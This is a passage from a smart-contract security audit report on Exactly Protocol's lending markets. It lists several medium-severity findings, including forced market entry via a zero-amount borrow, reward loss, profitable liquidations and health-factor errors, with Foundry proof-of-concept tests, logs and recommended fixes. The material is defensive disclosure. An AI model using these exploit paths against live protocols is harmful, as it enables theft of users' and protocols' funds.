        // Malicious user executes the attack (withdraws all from fixed pool before maturity)
        uint256 assetsDiscounted = marketOP.withdrawAtMaturity(maturity, positionAssets, 0, address(this), address(this));

        uint256 floatingLiquidityAfter = marketOP.previewRedeem(marketOP.balanceOf(address(this)));
        uint256 profits = floatingLiquidityAfter - floatingLiquidityBefore;

        // Before the attack, the attacker owned 1,003,236 OP tokens
        assertEq(floatingLiquidityBefore, 1_003_236.895405543416809745e18);

        // After the attack, the attacker owns 1,027,162 OP tokens
        assertEq(floatingLiquidityAfter, 1_027_162.288501014638447865e18);

        // The attacker has made a profit of 23,925 OP tokens
        assertEq(profits, 23_925.39309547122163812e18);

        // The cost of the attack (early withdraw) is 488 OP tokens
        assertEq(positionAssets - assetsDiscounted, 488.538063290105034868e18);
    }
}
```

**Note:** The values used on the PoC are intentionally chosen or inflated to demonstrate the bug in the implementation, and they do not affect the validity of this issue. 

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L363

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to accrue the floating debt always before updating the value of `floatingBackupBorrowed`. An example of the implementation fix could be the following:

```diff

  function depositAtMaturity(
    uint256 maturity,
    uint256 assets,
    uint256 minAssetsRequired,
    address receiver
  ) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {
    // ...
      
+   depositToTreasury(updateFloatingDebt());

    floatingBackupBorrowed -= pool.deposit(assets);
    // ...
  }
  
  function withdrawAtMaturity(
    uint256 maturity,
    uint256 positionAssets,
    uint256 minAssetsRequired,
    address receiver,
    address owner
  ) external whenNotPaused returns (uint256 assetsDiscounted) {
    // ...
    
+   depositToTreasury(updateFloatingDebt());
    
    floatingBackupBorrowed = newFloatingBackupBorrowed;
    
    // ...
  }
  
  function noTransferRepayAtMaturity(
    uint256 maturity,
    uint256 positionAssets,
    uint256 maxAssets,
    address borrower,
    bool canDiscount
  ) internal returns (uint256 actualRepayAssets) {
    // ...
    
+   depositToTreasury(updateFloatingDebt());

    floatingBackupBorrowed -= pool.repay(principalCovered);

    // ...
  }

```



## Discussion

**santipu03**

The root cause of this issue (and its duplicates) is the missing update of floating debt in some key functions such as `depositAtMaturity`, `withdrawAtMaturity`, `noTransferRepayAtMaturity`, and `liquidate`.

Issues that describe the same root cause but fail to describe a valid attack path and a clear impact have been marked invalid. 

# Issue M-4: borrow() maliciously let others to enter market 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/76 

## Found by 
KupiaSec, Shield, Trumpero, bin2chen
## Summary
After `borrow()` is executed successfully, `borrower` will automatically enter the market.
This method performs a security check to determine if the `msg.sender` allowance is sufficient to avoid malicious operations.
But it doesn't limit the borrow number !=0, so anyone can execute without an allowance.
This causes the permission check to fail and maliciously allows others to enter the market

## Vulnerability Detail
`borrow()` is executed by calling `auditor.checkBorrow()`.
`checkBorrow()` will cause the `borrower` to automatically enter the market.
```solidity
contract Market is Initializable, AccessControlUpgradeable, PausableUpgradeable, ERC4626 {
..
  function borrow(
    uint256 assets,
    address receiver,
    address borrower
  ) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {
@> //@audit missing check assets !=0
    spendAllowance(borrower, assets);

...

@>  auditor.checkBorrow(this, borrower);
    asset.safeTransfer(receiver, assets);
  }

```
```solidity
contract Auditor is Initializable, AccessControlUpgradeable {
...
  function checkBorrow(Market market, address borrower) external {
    MarketData storage m = markets[market];
    if (!m.isListed) revert MarketNotListed();

    uint256 marketMap = accountMarkets[borrower];
    uint256 marketMask = 1 << m.index;

    // validate borrow state
    if ((marketMap & marketMask) == 0) {
      // only markets may call checkBorrow if borrower not in market
      if (msg.sender != address(market)) revert NotMarket();

@>    accountMarkets[borrower] = marketMap | marketMask;
      emit MarketEntered(market, borrower);
    }
```

however,  this method does not determine that `assets` cannot be 0. If the user specifies `assets=0` then the security check for allowances can be skipped, and the `borrower` will enter the market after the method is executed successfully

### POC

The following code demonstrates that no allowances are needed to let the `borrower` enter the market

add to `Market.t.sol`
```solidity
  function testAnyoneEnterMarket() external {
    (,, uint8 index,,) = auditor.markets(
      Market(address(market))
    );
    bool inMarket = auditor.accountMarkets(BOB) & (1 << index) == 1;
    console2.log("bob in market(before):",inMarket);
    console2.log("anyone execute borrow(0)");
    vm.prank(address(0x1230000123)); //anyone
    market.borrow(0, address(this), BOB);
    inMarket = auditor.accountMarkets(BOB) & (1 << index) == 1;
    console2.log("bob in market(after):",inMarket);
  }  
```

```console
$ forge test -vvv --match-test testAnyoneEnterMarket

Ran 1 test for test/Market.t.sol:MarketTest
[PASS] testAnyoneEnterMarket() (gas: 172080)
Logs:
  bob in market(before): false
  anyone execute borrow(0)
  bob in market(after): true

```

## Impact

The current protocol makes a strict distinction between enter market or not.
A user can be a simple `LP` to a market and not participate in borrowing or collateralization, which is then protected and cannot be used as a `seize market` for liquidation purposes.
At the same time, if the user does not enter the market, then the user can access the assets as they wish without constraints.
And so on.
If any person can maliciously allow others to enter the market to break the rules. 
For example, maliciously liquidating `seize` a protected market

## Code Snippet
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L167
## Tool used

Manual Review

## Recommendation

```diff
  function borrow(
    uint256 assets,
    address receiver,
    address borrower
  ) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {
+   if (assets == 0) revert ZeroBorrow();
    spendAllowance(borrower, assets);
```

# Issue M-5: Rewards can disappear when new rewards are distributed in the RewardsController. 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/95 

## Found by 
0x73696d616f, Trumpero, ether\_sky
## Summary
The `RewardsController` distributes `rewards` to both `depositors` and `borrowers`.
When new `rewards` are available, the `admin` assigns them using the `config` function.
However, there is a logic error in this function, causing unclaimed `rewards` for users to disappear entirely.
## Vulnerability Detail
The `rewards distribution config` includes a `start time` and `duration`.
```solidity
struct Config {
  Market market;
  ERC20 reward;
  IPriceFeed priceFeed;
  uint32 start;   // @audit, here
  uint256 distributionPeriod;   // @audit, here
  uint256 targetDebt;
  uint256 totalDistribution;
  uint256 undistributedFactor;
  int128 flipSpeed;
  uint64 compensationFactor;
  uint64 transitionFactor;
  uint64 borrowAllocationWeightFactor;
  uint64 depositAllocationWeightAddend;
  uint64 depositAllocationWeightFactor;
}
```
Whenever a `borrower` changes his `balance`, we update the `rewards index` for that `borrower` and calculate the `unclaimed rewards`.
```solidity
function handleBorrow(address account) external {
  Market market = Market(msg.sender);
  AccountOperation[] memory ops = new AccountOperation[](1);
  (, , uint256 accountFloatingBorrowShares) = market.accounts(account);

  Distribution storage dist = distribution[market];
  uint256 available = dist.availableRewardsCount;
  for (uint128 r = 0; r < available; ) {
    ERC20 reward = dist.availableRewards[r];
    ops[0] = AccountOperation({
      operation: true,
      balance: accountFloatingBorrowShares + accountFixedBorrowShares(market, account, dist.rewards[reward].start)
    });
    update(account, Market(msg.sender), reward, ops);  // @audit, here
    unchecked {
      ++r;
    }
  }
}
```
There are two types of `borrow shares`: `floating shares` and `fixed shares`.
The calculation for `fixed shares` is based on the `rewards distribution start time`.
```solidity
function previewAllocation(
  RewardData storage rewardData,
  Market market,
  uint256 deltaTime
) internal view returns (uint256 borrowIndex, uint256 depositIndex, uint256 newUndistributed) {
  TotalMarketBalance memory m;
  m.floatingDebt = market.floatingDebt();
  m.floatingAssets = market.floatingAssets();
  TimeVars memory t;
  t.start = rewardData.start;
  t.end = rewardData.end;
  {
    uint256 firstMaturity = t.start - (t.start % FixedLib.INTERVAL) + FixedLib.INTERVAL;  // @audit, here
    uint256 maxMaturity = block.timestamp -
      (block.timestamp % FixedLib.INTERVAL) +
      (FixedLib.INTERVAL * market.maxFuturePools());
    uint256 fixedDebt;
    for (uint256 maturity = firstMaturity; maturity <= maxMaturity; ) {  // @audit, here
      (uint256 borrowed, ) = market.fixedPoolBalance(maturity);
      fixedDebt += borrowed;
      unchecked {
        maturity += FixedLib.INTERVAL;
      }
    }
    m.debt = m.floatingDebt + fixedDebt;
    m.fixedBorrowShares = market.previewRepay(fixedDebt);
  }
}
```

Now, suppose there are new upcoming `rewards`, and the `rewards distribution` is scheduled for the future.
In this case, the `start time` will be updated with the new value,
```solidity
function config(Config[] memory configs) external onlyRole(DEFAULT_ADMIN_ROLE) {
    if (block.timestamp < end) {
      uint256 released = 0;
      uint256 elapsed = 0;
      if (block.timestamp > start) {
        released =
          rewardData.lastConfigReleased +
          rewardData.releaseRate *
          (block.timestamp - rewardData.lastConfig);
        elapsed = block.timestamp - start;
        if (configs[i].totalDistribution <= released || configs[i].distributionPeriod <= elapsed) {
          revert InvalidConfig();
        }
        rewardData.lastConfigReleased = released;
      }

      rewardData.releaseRate =
        (configs[i].totalDistribution - released) /
        (configs[i].distributionPeriod - elapsed);
    } else if (rewardData.start != configs[i].start) {
      rewardData.start = configs[i].start;  // @audit, here
      rewardData.lastUpdate = configs[i].start;
      rewardData.releaseRate = configs[i].totalDistribution / configs[i].distributionPeriod;
      rewardData.lastConfigReleased = 0;
    }
  }
}
```
The issue is that the `fixed borrow shares` from the `old start time` to the `new start time` are removed in the `rewards calculation`.
```solidity
function accountFixedBorrowShares(
  Market market,
  address account,
  uint32 start
) internal view returns (uint256 fixedDebt) {
  uint256 firstMaturity = start - (start % FixedLib.INTERVAL) + FixedLib.INTERVAL;  // @audit, here
  uint256 maxMaturity = block.timestamp -
    (block.timestamp % FixedLib.INTERVAL) +
    (FixedLib.INTERVAL * market.maxFuturePools());

  for (uint256 maturity = firstMaturity; maturity <= maxMaturity; ) {  // @audit, here
    (uint256 principal, ) = market.fixedBorrowPositions(maturity, account);
    fixedDebt += principal;
    unchecked {
      maturity += FixedLib.INTERVAL;
    }
  }
  fixedDebt = market.previewRepay(fixedDebt);
}
```
It's important to note that these `shares` are actually part of the previous `rewards distribution`, but `borrowers` may not have updated their `rewards` in time.

Let's consider an example.
Two `borrowers`, `BOB` and `ALICE`, engage in borrowing operations.
They `borrow` funds at `maturity` periods of `4 weeks`, `12 weeks` and `16 weeks`.
The current `rewards distribution` starts at time `0` and lasts for `12 weeks`.

Both `borrowers` have the same `claimable rewards` amount obviously.
`BOB` `claims` his `rewards` after `18 weeks` pass, but `ALICE` delays `claiming`.
Meanwhile, the `admin` sets a new `start date` for upcoming `rewards`.

When `ALICE` finally claims her `rewards`, the `fixed borrow shares` before this `new start date` are removed from the calculation.
Consequently, she loses a significant portion of her `rewards`.
Specific values can be described in the below `log`.
```solidity
block.timestamp                ==>   0
usdcConfig.start               ==>   0
usdcConfig.distributionPeriod  ==>   12 weeks
*******************
block.timestamp                ==>   4838400
*******************
block.timestamp                ==>   10886400
Claimable for ALICE            ==>   999999975000000000000
Claimable for BOB              ==>   999999975000000000000
*******************
Reward Balance for BOB         ==>   999999975000000000000
Reward Balance for ALICE       ==>   734619963000000000000
```

Please add below test to the `RewardsController.t.sol`.
```solidity
function testResetConfig () external {
  vm.prank(ALICE);
  marketUSDC.approve(address(this), 100 ether);

  vm.prank(BOB);
  marketUSDC.approve(address(this), 100 ether);

  vm.prank(ALICE);
  auditor.enterMarket(marketUSDC);

  vm.prank(BOB);
  auditor.enterMarket(marketUSDC);

  marketUSDC.deposit(50 ether, ALICE);
  marketUSDC.deposit(50 ether, BOB);
  
  RewardsController.Config memory usdcConfig = rewardsController.rewardConfig(marketUSDC, opRewardAsset);

  console2.log("block.timestamp                ==>  ", block.timestamp);
  console2.log("usdcConfig.start               ==>  ", usdcConfig.start);
  console2.log("usdcConfig.distributionPeriod  ==>  ", usdcConfig.distributionPeriod / 1 weeks, "weeks");
  assertEq(usdcConfig.distributionPeriod, 12 weeks);

  marketUSDC.borrowAtMaturity(4 weeks, 1 ether, 20 ether, ALICE, ALICE);
  marketUSDC.borrowAtMaturity(4 weeks, 1 ether, 20 ether, BOB, BOB);

  console2.log("*******************");
  vm.warp(8 weeks);
  console2.log("block.timestamp                ==>  ", block.timestamp);
  marketUSDC.borrowAtMaturity(12 weeks, 1 ether, 20 ether, ALICE, ALICE);
  marketUSDC.borrowAtMaturity(12 weeks, 1 ether, 20 ether, BOB, BOB);
  marketUSDC.borrowAtMaturity(16 weeks, 2 ether, 20 ether, ALICE, ALICE);
  marketUSDC.borrowAtMaturity(16 weeks, 2 ether, 20 ether, BOB, BOB);

  console2.log("*******************");
  vm.warp(18 weeks);
  console2.log("block.timestamp                ==>  ", block.timestamp);
  console2.log("Claimable for ALICE            ==>  ", rewardsController.allClaimable(ALICE, opRewardAsset));
  console2.log("Claimable for BOB              ==>  ", rewardsController.allClaimable(BOB, opRewardAsset));

  vm.prank(BOB);
  rewardsController.claimAll(BOB);

  opRewardAsset.mint(address(rewardsController), 4_000 ether);
  RewardsController.Config[] memory configs = new RewardsController.Config[](1);
  configs[0] = RewardsController.Config({
    market: marketUSDC,
    reward: opRewardAsset,
    priceFeed: MockPriceFeed(address(0)),
    targetDebt: 20_000e6,
    totalDistribution: 2_000 ether,
    start: uint32(block.timestamp),
    distributionPeriod: 12 weeks,
    undistributedFactor: 0.5e18,
    flipSpeed: 2e18,
    compensationFactor: 0.85e18,
    transitionFactor: 0.64e18,
    borrowAllocationWeightFactor: 0,
    depositAllocationWeightAddend: 0.02e18,
    depositAllocationWeightFactor: 0.01e18
  });
  rewardsController.config(configs);

  vm.prank(ALICE);
  rewardsController.claimAll(ALICE);

  console2.log("*******************");
  console2.log("Reward Balance for BOB         ==>  ", opRewardAsset.balanceOf(BOB));
  console2.log("Reward Balance for ALICE       ==>  ", opRewardAsset.balanceOf(ALICE));
}
```
## Impact
The `admin` can not consider whether all `borrowers` have already `claimed` their `rewards` before setting a `new rewards start time` so this can happen easily.
## Code Snippet
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L826-L827
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L78
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L481-L495
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L693-L694
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L367
## Tool used

Manual Review

## Recommendation

# Issue M-6: The claimable rewards amount for borrowers decreases over time 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/98 

The protocol has acknowledged this issue.

## Found by 
Trumpero, ether\_sky
## Summary
The `RewardsController` handles the distribution of `rewards` for both `borrowers` and `depositors`.
Once `rewards` are assigned to users, they should not be changed, as is typical in most `rewards distribution system`.
However, the actual `rewards` amounts that users can `claim` will vary depending on when they choose to `claim` them.
In other words, the `claimable rewards amount` decreases over time.
## Vulnerability Detail
There are two types of `borrow shares`: `floating borrow shares` and `fixed borrow shares`.
When calculating the `claimable rewards` for `borrowers`, we compute the `fixed borrow shares`.
```solidity
function claim(
  MarketOperation[] memory marketOps,
  address to,
  ERC20[] memory rewardsList
) public claimSender returns (ERC20[] memory, uint256[] memory claimedAmounts) {
  uint256 rewardsCount = rewardsList.length;
  claimedAmounts = new uint256[](rewardsCount);
  address sender = _claimSender;
  for (uint256 i = 0; i < marketOps.length; ) {
    MarketOperation memory marketOperation = marketOps[i];
    Distribution storage dist = distribution[marketOperation.market];
    uint256 availableRewards = dist.availableRewardsCount;
    for (uint128 r = 0; r < availableRewards; ) {
      update(
        sender,
        marketOperation.market,
        dist.availableRewards[r],
        accountBalanceOperations(  // @audit, here
          marketOperation.market,
          marketOperation.operations,
          sender,
          dist.rewards[dist.availableRewards[r]].start
        )
      );
      unchecked {
        ++r;
      }
    }
  }
}
```
The calculation for `fixed borrow shares` depends on the current `floating debt amount`.
```solidity
function accountFixedBorrowShares(
  Market market,
  address account,
  uint32 start
) internal view returns (uint256 fixedDebt) {
  uint256 firstMaturity = start - (start % FixedLib.INTERVAL) + FixedLib.INTERVAL;
  uint256 maxMaturity = block.timestamp -
    (block.timestamp % FixedLib.INTERVAL) +
    (FixedLib.INTERVAL * market.maxFuturePools());

  for (uint256 maturity = firstMaturity; maturity <= maxMaturity; ) {
    (uint256 principal, ) = market.fixedBorrowPositions(maturity, account);
    fixedDebt += principal;
    unchecked {
      maturity += FixedLib.INTERVAL;
    }
  }
  fixedDebt = market.previewRepay(fixedDebt);  // @audit, here
}
```
Since the `floating debt` increases overtime, the `fixed borrow shares` decreases accordingly.
```solidity
function previewBorrow(uint256 assets) public view returns (uint256) {
  uint256 supply = totalFloatingBorrowShares; // Saves an extra SLOAD if totalFloatingBorrowShares is non-zero.

  return supply == 0 ? assets : assets.mulDivUp(supply, totalFloatingBorrowAssets());  // @audit, here
}

function totalFloatingBorrowAssets() public view returns (uint256) {
  uint256 memFloatingDebt = floatingDebt;
  uint256 memFloatingAssets = floatingAssets;
  uint256 newDebt = memFloatingDebt.mulWadDown(
    interestRateModel
      .floatingRate(
        floatingUtilization(memFloatingAssets, memFloatingDebt),
        globalUtilization(memFloatingAssets, memFloatingDebt, floatingBackupBorrowed)
      )
      .mulDivDown(block.timestamp - lastFloatingDebtUpdate, 365 days)
  );
  return memFloatingDebt + newDebt; // @audit, here
}
```
Consequently, the `claimable rewards amount` also decreases over time.

Let's consider an example.
Two `borrowers`, `BOB` and `ALICE`, `borrow` funds at a `maturity` of `4 weeks`.
After `1 week`, the `claimable rewards amount` for both `borrowers` is obviously the same.
`BOB` updates his `rewards index` every day.( for testing purpose, simulate this using the `handleBorrow` function with `0` balance change in the test)
After `12 weeks`, the `claimable rewards amount` for both `borrowers` are different.
The `rewards` for `BOB` are larger than those for `ALICE`.
This illustrates that if a user misses updating their `rewards index`, the `claimable rewards amount` decreases.
Please check below log.
```solidity
Clamaible after 1 weeks for ALICE    =>  17492241039103089964
Clamaible after 1 weeks for BOB      =>  17492241039103089964
*****************
Clamaible after 12 weeks for ALICE   =>  208531472281735404397
Clamaible after 12 weeks for BOB     =>  209300027311073978764
```

Please add below test to `RewardsController.t.sol`.
```solidity
function testRewardBalanceCheck() external {
  vm.prank(ALICE);
  marketUSDC.approve(address(this), 100 ether);

  vm.prank(BOB);
  marketUSDC.approve(address(this), 100 ether);

  vm.prank(ALICE);
  auditor.enterMarket(marketUSDC);

  vm.prank(BOB);
  auditor.enterMarket(marketUSDC);

  marketUSDC.deposit(30 ether, ALICE);
  marketUSDC.deposit(30 ether, BOB);

  marketUSDC.borrowAtMaturity(4 weeks, 1 ether, 20 ether, ALICE, ALICE);
  marketUSDC.borrowAtMaturity(4 weeks, 1 ether, 20 ether, BOB, BOB);

  marketUSDC.deposit(40 ether, address(this));
  marketUSDC.borrow(20 ether, address(this), address(this));
  vm.warp(1 weeks);
  console2.log("Clamaible after 1 weeks for ALICE    => ", rewardsController.allClaimable(ALICE, opRewardAsset));
  console2.log("Clamaible after 1 weeks for BOB      => ", rewardsController.allClaimable(BOB, opRewardAsset));

  for (uint256 i = 1; i < 12 * 7; i ++) {
    vm.warp(i * 1 days);
    vm.prank(address(marketUSDC));
    rewardsController.handleBorrow(BOB);
  }


  vm.warp(12 weeks);
  console2.log("*****************");
  console2.log("Clamaible after 12 weeks for ALICE   => ", rewardsController.allClaimable(ALICE, opRewardAsset));
  console2.log("Clamaible after 12 weeks for BOB     => ", rewardsController.allClaimable(BOB, opRewardAsset));
}
```
## Impact
Whenever a `borrower` changes the `balance`, the `rewards index` is updated.
At that moment, the `total fixed borrow shares` is the sum of `individual fixed borrow shares`, and the current available `rewards` are divided by this `total fixed borrow shares`.
However, when other `borrowers` claim their `rewards` later on, their `fixed borrow shares` are less than they were at the time of `update`.
This reduction in `fixed borrow shares` leads to a decrease in the actual `claimed rewards`.
## Code Snippet
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L116-L121
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/RewardsController.sol#L379
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L954-L958
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L919
## Tool used

Manual Review

## Recommendation
We can take a snapshot of the `fixed borrow shares` when `fixed borrowing` occurs.

# Issue M-7: Profitable liquidations and accumulation of bad debt due to earnings accumulator not being triggered before liquidating 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/101 

## Found by 
0x73696d616f
## Summary

The earnings accumulator is not updated and converted to `floatingAssets` pre liquidation, leading to an instantaneous increase of balance of the liquidatee if it has shares which causes a profitable liquidation and the accumulation of bad debt.

## Vulnerability Detail

`Market::liquidate()` fetches the balance and debt of a user and calculates the amount to liquidate based on them to achieve a target health, or if not possible, seize all the balance of the liquidatee, to get as much collateral as possible. Then `Auditor::handleBadDebt()` is called in the end if the user still had debt but no collateral.

However, the protocol does not take into account that the liquidatee will likely have market shares due to previous deposits, which will receive the pro-rata `lendersAssets` and debt from the `penaltyRate` if the maturity date of a borrow was expired. 

Thus, in `Auditor::checkLiquidation()`, it calculates the collateral based on `totalAssets()`, which does not take into account an `earningsAccumulator` increase due to the 2 previously mentioned reasons, and `base.seizeAvailable` will be smaller than supposed. This means that it will end up convering the a debt and collateral balance to get the desired ratio (or the assumed maximum collateral), but due to the `earningsAccumulator`, the liquidatee will have more leftover collateral.

This leftover collateral may allow the liquidatee to redeem more net assets than it had before the liquidation (as the POC will show), or if the leftover collateral is still smaller than the debt, it will lead to permanent bad debt. In any case, the protocol takes a loss in favor of the liquidatee.

Add the following test to `Market.t.sol`:
```solidity
function test_POC_ProfitableLiquidationForLiquidatee_DueToEarningsAccumulator() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;

  // BOB adds liquidity for liquidation
  vm.prank(BOB);
  market.depositAtMaturity(maturity + FixedLib.INTERVAL * 1, 2*assets, 0, BOB);

  // ALICE deposits and borrows
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, assets);
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  // Maturity is over and some time has passed, accruing extra debt fees
  skip(maturity + FixedLib.INTERVAL * 90 / 100);

  // ALICE net balance before liquidation
  (uint256 collateral, uint256 debt) = market.accountSnapshot(address(ALICE));
  uint256 preLiqCollateralMinusDebt = collateral - debt;

  // Liquidator liquidates
  address liquidator = makeAddr("liquidator");
  deal(address(asset), liquidator, assets);
  vm.startPrank(liquidator);
  asset.approve(address(market), type(uint256).max);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ALICE redeems and asserts that more assets were redeemed than pre liquidation
  vm.startPrank(ALICE);
  market.repayAtMaturity(maturity, type(uint256).max, type(uint256).max, ALICE);
  uint256 redeemedAssets = market.redeem(market.balanceOf(ALICE) - 1, ALICE, ALICE);

  assertEq(preLiqCollateralMinusDebt, 802618844937982683756);
  assertEq(redeemedAssets, 1556472132091811191541);
  assertGt(redeemedAssets, preLiqCollateralMinusDebt);
}
```

## Impact

Profitable liquidations for liquidatees, who would have no incentive to repay their debt as they could just wait for liquidations to profit. Or, if the debt is already too big, it could lead to the accumulation of bad debt as the liquidatee would have remaining collateral balance and `Auditor::handleBadDebt()` would never succeed.

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L514
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L552
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L599
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L611
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L925
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L219

## Tool used

Manual Review

Vscode

Foundry

## Recommendation

Add the following line to the begginning of `Market::liquidate()`:
`floatingAssets += accrueAccumulatedEarnings();`
This will update `lastAccumulatorAccrual`, so any increase in `earningsAccumulator` to lenders will not be reflected in `totalAssets()`, and the liquidatee will have all its collateral seized.

# Issue M-8: `TARGET_HEALTH` calculation does not consider the adjust factors of the picked seize and repay markets 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/117 

## Found by 
0x73696d616f, santiellena
## Summary

The `TARGET_HEALTH` calculation is correct, but returns the debt to pay considering that this debt corresponds to the average `adjustFactor`, which is false for more than 1 market, leading to significant deviation in the resulting health factor.

## Vulnerability Detail

The calculation of the required debt to repay is explained in the [MathPaper](https://github.com/exactly/papers/blob/main/ExactlyMathPaperV1.pdf), and it can be understood that the resulting debt to repay is based on the average adjust factor of all markets.

However, when liquidating, repay and seize markets are picked, possibly having different adjust factors. Thus, depending on the picked repay and seized market, the resulting health factor will be significantly different than the `TARGET_HEALTH`. This will either lead to losses for the liquidator or the liquidatee, in case the resulting health factor is smaller or bigger, respectively. 

If the resulting health factor is smaller, the liquidator would receive less assets and the protocol would be closer to accumulating bad debt (it may even be negative if the calculation is way off). Contrarily, if it is higher, the liquidator will have more assets removed than supposed, resulting in losses. 

A test was carried out in `Market.t.sol` showing that depending on the market picked, the health factor is either approximately `1.37` or `1.15`, due to the adjust factor.
The user 
- Deposited `20_000e18` in a `DAI` market with an adjust factor of `0.8`.
- Borrowed `20_000e18*0.8^2` in the `DAI` market.
- Deposited `10_000e18` in a `WETH` market with an adjust factor of `0.9`.
- Borrowed `10_000e18*0.9^2` in a `WETH` market.
The health factor is `(20_000*0.8 + 10000*0.9) / (20000*0.8^2/0.8 + 10000*0.9^2/0.9) = 1`.
1 second passes to make the health factor smaller than 1.
Now, depending on the picked repay and seize markets, the resulting health factor will be very different.

The average adjust factor is `(20_000*0.8 + 10000*0.9) * (20000*0.8^2 + 10000*0.9^2) / (20000*0.8^2/0.8 + 10000*0.9^2/0.9) / (20000 + 10000) = 0.6967`.

The close factor is `(1.25 - 1) / (1.25 - 0.6967*1.1) = 0.5169`.

The debt repayed using the close factor is `(20000*0.8^2 + 10000*0.9^2)*0.5169 = 10803`.
The Collateral repayed is `10803 * 1.1 = 11883`.

The issue is that the debt and collateral are averaged on the adjust factor, but it is being repayed on a single market. 

Repaying in the `DAI` market, the resulting health factor is `((20_000 - 11883)*0.8 + 10000*0.9) / ((20000*0.8^2 - 10803)/0.8 + 10000*0.9^2/0.9) = 1.3477`.

If the test is inverted, repaying in the `WETH` market will lead to a health factor of `1.15`.

```solidity
function test_POC_WrongHealthFactor() external {
  // Change to false to test liquidating in the WETH market
  // in exactly the same conditions except the adjust factor
  bool marketDAI = true;

  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  uint256 marketAssets = marketDAI ? 2*assets : assets;
  uint256 wethAssets = marketDAI ? assets : 2*assets;

  vm.startPrank(ALICE);

  // ALICE deposits and borrows DAI
  deal(address(asset), ALICE, marketAssets);
  market.deposit(marketAssets, ALICE);
  market.borrow(marketAssets*8*8/10/10, ALICE, ALICE);
  
  // ALICE deposits and borrows weth
  deal(address(weth), ALICE, wethAssets);
  weth.approve(address(marketWETH), wethAssets);
  marketWETH.deposit(wethAssets, ALICE);
  marketWETH.borrow(wethAssets*9*9/10/10, ALICE, ALICE);

  vm.stopPrank();

  skip(1);

  // LIQUIDATION of DAI MARKET, 0.8 adjust factor
  if (marketDAI) {
    deal(address(asset), address(market), 100_000 ether);
    address liquidator = makeAddr("liquidator");
    deal(address(asset), liquidator, 100_000_000 ether);
    vm.startPrank(liquidator);
    asset.approve(address(market), type(uint256).max);
    market.liquidate(ALICE, type(uint256).max, market);
    vm.stopPrank();
  } 

  // LIQUIDATION of WETH MARKET, 0.9 adjust factor
  if (!marketDAI) {
    deal(address(weth), address(marketWETH), 100_000 ether);
    address liquidator = makeAddr("liquidator");
    deal(address(weth), liquidator, 100_000_000 ether);
    vm.startPrank(liquidator);
    weth.approve(address(marketWETH), type(uint256).max);
    marketWETH.liquidate(ALICE, type(uint256).max, marketWETH);
    vm.stopPrank();
  }

  // RATIO is smaller than 1.25, liquidator did not liquidate as much as if it was in
  // a single market
  (uint256 collateral, uint256 debt) = auditor.accountLiquidity(address(ALICE), Market(address(0)), 0);
  assertEq(collateral*1e18 / debt, marketDAI ? 1347680781176165186 : 1146310462433177450);
}
```

## Impact

Losses for the liquidator or the liquidatee and possible accumulation of bad debt, depending on the picked market.

## Code Snippet

https://github.com/exactly/papers/blob/main/ExactlyMathPaperV1.pdf
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Auditor.sol#L238-L243

## Tool used

Manual Review

Vscode

Foundry

## Recommendation

The debt to repay should take into account the adjust factors of the seize and repay markets. In `auditor::checkLiquidation()`, the `maxRepayAssets`, `base.totalDebt.mulWadUp(Math.min(1e18, closeFactor)), must consider the adjust factors of the chosen seize and repay markets.

# Issue M-9: When bad debts are cleared, there will be some untracked funds 

Source: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/130 

## Found by 
Trumpero, ether\_sky
## Summary
